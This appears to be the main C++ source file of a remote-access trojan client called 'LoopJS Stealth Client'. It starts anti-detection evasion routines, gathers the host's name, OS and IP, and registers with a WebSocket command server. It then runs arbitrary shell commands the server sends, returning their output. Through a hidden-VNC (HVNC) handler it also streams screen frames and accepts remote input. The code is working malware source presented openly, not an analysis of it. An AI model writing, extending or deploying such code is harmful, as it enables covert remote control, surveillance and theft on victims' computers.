#include <iostream>
#include <thread>
#include <chrono>
#include <string>
#include <memory>
#include <iomanip>
#include <sstream>
#include <ctime>
#include "websocket_client.h"
#include "command_handler.h"
#include "system_info.h"
#include "json_utils.h"
#include "anti_detection.h"
#include "hvnc_handler.h"
#include "json.hpp"
#include <windows.h>

using json = nlohmann::json;

class StealthClientApp {
public:
    StealthClientApp() 
        : m_wsClient(std::make_unique<StealthClient::WebSocketClient>())
        , m_commandHandler(std::make_unique<StealthClient::CommandHandler>())
        , m_hvncHandler(std::make_unique<StealthClient::HvncHandler>())
        , m_running(false)
        , m_registered(false)
    {
        SetupCallbacks();
        SetupHvncCallbacks();
    }

    ~StealthClientApp() {
        Stop();
    }

    bool Start() {
        std::cout << "==========================================" << std::endl;
        std::cout << "🚀 ENHANCED STEALTH CLIENT STARTING UP!" << std::endl;
        std::cout << "==========================================" << std::endl;

        // Initialize anti-detection evasion system FIRST
        std::cout << "[DEBUG] Initializing anti-detection evasion system..." << std::endl;
        if (!StealthClient::InitializeEvasion()) {
            std::cerr << "[ERROR] Failed to initialize evasion system - aborting" << std::endl;
            return false;
        }
        
        // Apply all evasion techniques
        std::cout << "[DEBUG] Applying evasion techniques..." << std::endl;
        if (!StealthClient::ApplyEvasionTechniques()) {
            std::cerr << "[ERROR] Failed to apply evasion techniques - aborting" << std::endl;
            return false;
        }
        
        // Verify evasion is working
        std::cout << "[DEBUG] Verifying evasion techniques..." << std::endl;
        if (!StealthClient::VerifyEvasion()) {
            std::cerr << "[ERROR] Evasion verification failed - aborting" << std::endl;
            return false;
        }
        
        std::cout << "[DEBUG] Anti-detection evasion system active" << std::endl;
        std::cout << StealthClient::GetEvasionSummary() << std::endl;

        // Collect system information
        m_systemInfo = StealthClient::SystemInfoCollector::CollectSystemInfo();
        std::cout << "System Info Collected:" << std::endl;
        std::cout << "  Computer: " << m_systemInfo.computerName << std::endl;
        std::cout << "  OS: " << m_systemInfo.osVersion << std::endl;
        std::cout << "  Architecture: " << m_systemInfo.architecture << std::endl;
        std::cout << "  IP: " << m_systemInfo.ipAddress << std::endl;

        // Generate UUID
        m_uuid = GenerateUUID();
        std::cout << "Generated UUID: " << m_uuid << std::endl;

        // Connect to WebSocket
        std::string wsUrl = "ws://localhost:8080/ws";
        std::cout << "Connecting to: " << wsUrl << std::endl;

        if (!m_wsClient->Connect(wsUrl)) {
            std::cerr << "Failed to connect to WebSocket server" << std::endl;
            return false;
        }

        m_running = true;

        // Start heartbeat timer
        m_heartbeatThread = std::make_unique<std::thread>(&StealthClientApp::HeartbeatLoop, this);

        std::cout << "✅ Stealth Client started successfully!" << std::endl;
        return true;
    }

    void Stop() {
        if (!m_running) {
            return;
        }

        std::cout << "Stopping Stealth Client..." << std::endl;
        m_running = false;

        if (m_heartbeatThread && m_heartbeatThread->joinable()) {
            m_heartbeatThread->join();
        }

        m_wsClient->Disconnect();
        std::cout << "Stealth Client stopped." << std::endl;
    }

private:
    void SetupCallbacks() {
        // WebSocket connection callback
        m_wsClient->SetConnectionCallback([this](bool connected) {
            if (connected) {
                std::cout << "✅ WebSocket connected, sending registration..." << std::endl;
                SendRegistration();
            } else {
                std::cout << "❌ WebSocket disconnected" << std::endl;
                m_registered = false;
            }
        });

        // WebSocket message callback
        m_wsClient->SetMessageCallback([this](const std::string& message) {
            HandleMessage(message);
        });

        // WebSocket error callback
        m_wsClient->SetErrorCallback([this](const std::string& error) {
            std::cerr << "WebSocket Error: " << error << std::endl;
        });

        // Command handler output callback
        m_commandHandler->SetOutputCallback([this](const std::string& taskId, const std::string& output, const std::string& status) {
            SendCommandOutput(taskId, output, status);
        });
    }

    void SetupHvncCallbacks() {
        // Set frame callback to send frames via WebSocket
        m_hvncHandler->SetFrameCallback([this](const StealthClient::FrameData& frame, const std::string& sessionId) {
            // Encode frame data to base64
            std::string base64Data = Base64Encode(frame.data);
            
            // Create frame message
            json frameMsg;
            frameMsg["type"] = "hvnc_frame";
            frameMsg["sessionId"] = sessionId;
            frameMsg["frameData"] = base64Data;
            frameMsg["frameInfo"] = json::object();
            frameMsg["frameInfo"]["width"] = frame.width;
            frameMsg["frameInfo"]["height"] = frame.height;
            frameMsg["frameInfo"]["size"] = frame.size;
            
            m_wsClient->SendMessage(frameMsg.dump());
        });
        
        // Set send message callback
        m_hvncHandler->SetSendMessageCallback([this](const std::string& message) {
            m_wsClient->SendMessage(message);
        });
    }

    void SendRegistration() {
        std::string message = StealthClient::JsonUtils::CreateRegisterMessage(
            m_uuid,
            m_systemInfo.computerName,
            m_systemInfo.ipAddress,
            m_systemInfo.osVersion
        );
        
        std::cout << "[Stealth][Registration] Payload: " << message << std::endl;
        
        if (!m_wsClient->SendMessage(message)) {
            std::cerr << "Failed to send registration message" << std::endl;
        }
    }

    void SendHeartbeat() {
        if (!m_registered) {
            return;
        }

        std::string message = StealthClient::JsonUtils::CreateHeartbeatMessage(m_uuid);
        std::cout << "[Stealth][Heartbeat] Sending at " << GetCurrentTimestamp() << std::endl;
        m_wsClient->SendMessage(message);
    }

    void SendCommandOutput(const std::string& taskId, const std::string& output, const std::string& status) {
        std::string message = StealthClient::JsonUtils::CreateOutputMessage(taskId, output, status);
        std::cout << "Sending command output for task " << taskId << ": " << status << std::endl;
        m_wsClient->SendMessage(message);
    }

    void HandleMessage(const std::string& message) {
        try {
            json msg = json::parse(message);
            std::string type = msg.value("type", "");

            if (type == "register_success") {
                std::cout << "🎉 Registration successful!" << std::endl;
                m_registered = true;
            }
            else if (type == "error") {
                std::string errorMsg = msg.value("message", "");
                std::cerr << "Server error: " << errorMsg << std::endl;
            }
            else if (type == "command") {
                std::string cmd = msg.value("cmd", "");
                std::string taskId = msg.value("taskId", "");
                
                std::cout << "🎯 Received command: " << cmd << " (Task ID: " << taskId << ")" << std::endl;
                
                if (cmd == "execute") {
                    std::string command = msg.value("command", "");
                    m_commandHandler->ExecuteCommand(taskId, command);
                }
            }
            else if (type == "hvnc_start") {
                std::string sessionId = msg.value("sessionId", "");
                json settingsJson = msg.value("settings", json::object());
                
                StealthClient::HvncSettings settings;
                settings.quality = settingsJson.value("quality", "medium");
                settings.fps = settingsJson.value("fps", 15);
                settings.compression = settingsJson.value("compression", "high");
                
                std::cout << "[HVNC] Starting session: " << sessionId << std::endl;
                
                if (m_hvncHandler->Start(sessionId, settings)) {
                    // Send success response
                    json response;
                    response["type"] = "hvnc_response";
                    response["sessionId"] = sessionId;
                    response["status"] = "connected";
                    response["screenInfo"] = json::object();
                    response["screenInfo"]["width"] = GetSystemMetrics(SM_CXSCREEN);
                    response["screenInfo"]["height"] = GetSystemMetrics(SM_CYSCREEN);
                    
                    m_wsClient->SendMessage(response.dump());
                } else {
                    json response;
                    response["type"] = "hvnc_response";
                    response["sessionId"] = sessionId;
                    response["status"] = "error";
                    response["error"] = "Failed to start HVNC session";
                    
                    m_wsClient->SendMessage(response.dump());
                }
            }
            else if (type == "hvnc_stop") {
                std::string sessionId = msg.value("sessionId", "");
                
                std::cout << "[HVNC] Stopping session: " << sessionId << std::endl;
                
                m_hvncHandler->Stop();
                
                // Send stop response
                json response;
                response["type"] = "hvnc_response";
                response["sessionId"] = sessionId;
                response["status"] = "disconnected";
                
                m_wsClient->SendMessage(response.dump());
            }
            else if (type == "hvnc_command") {
                std::string sessionId = msg.value("sessionId", "");
                std::string command = msg.value("command", "");
                json params = msg.value("params", json::object());
                
                std::cout << "[HVNC] Received command: " << command << std::endl;
                
                if (m_hvncHandler->IsActive() && m_hvncHandler->GetSessionId() == sessionId) {
                    m_hvncHandler->HandleCommand(command, params.dump());
                }
            }
            else if (type == "hvnc_screenshot") {
                std::string sessionId = msg.value("sessionId", "");
                
                std::cout << "[HVNC] Screenshot requested for session: " << sessionId << std::endl;
                
                // Screenshot functionality would be handled by capturing a frame
                // and sending it as a response
            }
        }
        catch (const std::exception& e) {
            std::cerr << "Error parsing message: " << e.what() << std::endl;
        }
    }
    
    std::string Base64Encode(const std::vector<uint8_t>& data) {
        static const char base64_chars[] = 
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        
        std::string encoded;
        int val = 0, valb = -6;
        
        for (uint8_t c : data) {
            val = (val << 8) + c;
            valb += 8;
            while (valb >= 0) {
                encoded.push_back(base64_chars[(val >> valb) & 0x3F]);
                valb -= 6;
            }
        }
        
        if (valb > -6) {
            encoded.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
        }
        
        while (encoded.size() % 4) {
            encoded.push_back('=');
        }
        
        return encoded;
    }

    void HeartbeatLoop() {
        while (m_running) {
            std::this_thread::sleep_for(std::chrono::seconds(30));
            if (m_running && m_registered) {
                SendHeartbeat();
            }
        }
    }

    std::string GenerateUUID() {
        // Simple UUID v4 generation
        std::string uuid = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx";
        const std::string chars = "0123456789abcdef";
        
        srand(static_cast<unsigned int>(time(nullptr)));
        
        for (char& c : uuid) {
            if (c == 'x') {
                c = chars[rand() % 16];
            } else if (c == 'y') {
                c = chars[(rand() % 4) + 8]; // 8, 9, a, b
            }
        }
        
        return uuid;
    }

    std::string GetCurrentTimestamp() {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(
            now.time_since_epoch()) % 1000;
        
        std::stringstream ss;
        ss << std::put_time(std::gmtime(&time_t), "%Y-%m-%dT%H:%M:%S");
        ss << '.' << std::setfill('0') << std::setw(3) << ms.count() << 'Z';
        return ss.str();
    }

private:
    std::unique_ptr<StealthClient::WebSocketClient> m_wsClient;
    std::unique_ptr<StealthClient::CommandHandler> m_commandHandler;
    std::unique_ptr<StealthClient::HvncHandler> m_hvncHandler;
    std::unique_ptr<std::thread> m_heartbeatThread;
    
    StealthClient::SystemInfoCollector::SystemInfo m_systemInfo;
    std::string m_uuid;
    
    std::atomic<bool> m_running;
    std::atomic<bool> m_registered;
};

int main() {
    std::cout << "Starting LoopJS Stealth Client..." << std::endl;
    
    StealthClientApp client;
    
    if (!client.Start()) {
        std::cerr << "Failed to start stealth client" << std::endl;
        return 1;
    }
    
    // Keep running until interrupted
    std::cout << "Stealth client is running. Press Ctrl+C to stop." << std::endl;
    
    try {
        while (true) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }
    catch (const std::exception& e) {
        std::cout << "Exception: " << e.what() << std::endl;
    }
    
    client.Stop();
    return 0;
}
